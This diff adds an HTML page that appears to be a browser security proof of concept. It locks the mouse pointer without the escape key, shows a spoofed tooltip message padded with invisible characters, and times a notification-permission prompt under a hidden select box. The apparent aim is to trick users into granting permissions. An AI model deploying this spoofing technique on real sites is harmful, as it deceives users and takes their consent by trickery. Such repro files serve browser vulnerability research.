@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <style>
+    /* pointerlock (without escape key) code */
+    body {
+      display: contents;
+    }
+  </style>
+
+  <script>
+     var permissionAsked = false;
+
+function setupCustomValidity() {
+  var spoofText = "";
+
+  spoofText += `This site is override the default 'escape' key.`
+
+  for (i = 0; i < 24; i++) {
+    spoofText += `${String.fromCharCode(8192)}`
+  }
+  spoofText += ` Press 'A̲l̲t̲+̲A̲' to take back control ⠀`
+
+  spoofText += `⠀⠀`
+
+  for (i = 0; i < 5; i++) {
+    spoofText += `${String.fromCharCode(8192)}`
+  }
+
+  spoofText += `⠀⠀`
+
+  for (i = 0; i < 5; i++) {
+    spoofText += `${String.fromCharCode(8192)}`
+  }
+
+  for (i = 0; i < 55; i++) {
+    spoofText += `${String.fromCharCode(8192)}`
+  }
+
+  spoofText += `⠀`
+
+  for (i = 0; i < 55; i++) {
+    spoofText += `${String.fromCharCode(8192)}`
+  }
+
+  spoofText += `⠀`
+
+
+  for (i = 0; i < 55; i++) {
+    spoofText += `${String.fromCharCode(8192)}`
+  }
+
+  spoofText += `⠀`
+
+
+  for (i = 0; i < 2; i++) {
+    spoofText += `${String.fromCharCode(8192)}`
+  }
+
+  spoofText += `⠀`
+
+  divSelect.setCustomValidity(spoofText);
+
+}
+
+    function setupCanvas() {
+      customValidityCanvas.toBlob(showValidity, "image/webp", 0);
+
+      // pointerlock (without escape key) code
+      var pointerLockCanvas = document.createElement("canvas");
+      pointerLockCanvas.toBlob(plf, "image/jpeg", 0);
+
+    }
+
+    function showValidity() {
+      divSelect.reportValidity();
+    }
+
+    function start() {
+    // pointerlock (without escape key) code
+      divPointer.requestPointerLock();
+
+      setTimeout(function () {
+        Notification.requestPermission();
+        permissionAsked = true;
+      }, 4400)
+
+      setTimeout(function () {
+          divSelect.reportValidity();
+      }, 4450)
+
+    }
+
+    // pointerlock (without escape key) code
+    function plf() {
+      divPointer.onselectstart = start;
+    }
+
+    function showValidityIf() {
+      if (permissionAsked) {
+        divSelect.reportValidity()
+      }
+    }
+  </script>
+</head>
+
+<body contenteditable="true" onload="setupCustomValidity(); setupCanvas()">
+  <!-- pointerlock (without escape key) code  -->
+  <div id="divPointer" style="margin-left: 20px; margin-top: 20px;" onmousedown="showValidityIf();" onfocus="start()">
+    -> Double-click here to start pointerlock (without escape key)
+  </div>
+  <select id="divSelect" style="opacity: 0; margin-top: 99px; margin-left: 310px;" size="55">
+  </select>
+
+  <canvas id="customValidityCanvas">
+  </canvas>
+
+
+</html>
